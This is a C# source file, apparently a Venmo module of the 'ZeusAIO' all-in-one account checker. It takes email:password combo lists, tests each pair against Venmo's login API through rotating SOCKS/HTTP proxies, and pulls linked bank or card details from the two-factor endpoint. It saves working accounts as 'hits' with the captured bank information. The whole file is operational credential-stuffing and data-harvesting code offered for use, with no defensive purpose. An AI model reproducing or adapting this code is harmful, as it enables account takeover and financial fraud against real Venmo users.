using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Venmo
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);


                            //Console.WriteLine(guid);
                            string guid = Guid.NewGuid().ToString();
                            CookieStorage cookies = new CookieStorage();
                            string csrfToken = VenmoGetCSRF(ref cookies);

                            req.Cookies = cookies;
                            req.UserAgent = "Venmo/8.4.0 (iPhone; iOS 13.2; Scale/3.0)";
                            req.AddHeader("Content-Type", "application/json");
                            req.AddHeader("Accept", "application/json; charset=utf-8");
                            req.AddHeader("Accept-Language", "en-US;q=1.0,el-GR;q=0.9");
                            req.AddHeader("device-id", guid);
                            req.AddHeader("csrftoken2", csrfToken);

                            HttpResponse res = req.Post(new Uri("https://api.venmo.com/v1/oauth/access_token"), new BytesContent(Encoding.Default.GetBytes("{\"phone_email_or_username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"client_id\":\"1\"}")));
                            string strResponse = res.ToString();
                            if (strResponse.Contains("Additional authentication is required"))
                            {
                                string secret = res["venmo-otp-secret"];
                                string capture = "";
                                capture = VenmoGetCaptures(cookies, secret, guid);
                                if (capture == "Free")
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - VENMO] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Venmo_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - VENMO] " + s[0] + ":" + s[1] + " | " + capture, Color.Green);
                                    }
                                    Export.AsResult("/Venmo_hits", s[0] + ":" + s[1] + " | " + capture);
                                    return false;
                                }
                                
                            }
                            else if (strResponse.Contains("{\"message\": \"Your email or password was incorrect.\""))
                            {
                                break;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;

        }
    
    static string VenmoGetCSRF(ref CookieStorage cookies)
    {
        while (true)
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    SetBasicRequestSettingsAndProxies(req);

                    cookies = new CookieStorage();
                    req.Cookies = cookies;
                    req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";

                    req.Post(new Uri("https://api.venmo.com/v1/oauth/access_token"), "{}", "application/json").ToString();


                    return cookies.GetCookies("https://api.venmo.com/")["csrftoken2"].Value;
                }
            }
            catch
            {
                    ZeusAIO.mainmenu.errors++;
                }
        return "";
    }
    static string VenmoGetCaptures(CookieStorage cookies, string secret, string guid)
    {
        while (true)
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    SetBasicRequestSettingsAndProxies(req);

                    req.AddHeader("device-id", guid);
                    req.AddHeader("Venmo-Otp-Secret", secret);
                    req.AddHeader("Content-Type", "application/json; charset=utf-8");
                    req.AddHeader("Venmo-Otp", "501107");
                    req.UserAgent = "Venmo/8.6.0 (iPhone; iOS 14.0; Scale/3.0)";
                    req.Cookies = cookies;

                    string strResponse = req.Get(new Uri($"https://api.venmo.com/v1/account/two-factor/token?client_id=1")).ToString();

                    if (strResponse.Contains("\", \"question_type\": \"card\"}]"))
                    {
                        string bankInfo = Regex.Match(strResponse, "\\[{\"value\": \"(.*?)\", \"question_type\": \"card\"}").Groups[1].Value;

                        return $"Bank Infomation: {bankInfo}";
                    }
                    else
                    {
                        return "Free";
                    }
                    break;
                }
            }
            catch
            {
                    ZeusAIO.mainmenu.errors++;
                }
        return "";
    }
    static void SetBasicRequestSettingsAndProxies(HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 10000;
            req.KeepAliveTimeout = 10000;
            req.ReadWriteTimeout = 10000;

            {
                string[] proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount)).Split(':');
                ProxyClient proxyClient = ZeusAIO.mainmenu.proxyProtocol == "SOCKS5" ? new Socks5ProxyClient(proxy[0], int.Parse(proxy[1])) : ZeusAIO.mainmenu.proxyProtocol == "SOCKS4" ? new Socks4ProxyClient(proxy[0], int.Parse(proxy[1])) : (ProxyClient)new HttpProxyClient(proxy[0], int.Parse(proxy[1]));
                if (proxy.Length == 4)
                {
                    proxyClient.Username = proxy[2];
                    proxyClient.Password = proxy[3];
                }
                req.Proxy = proxyClient;
            }
        }
    }
}
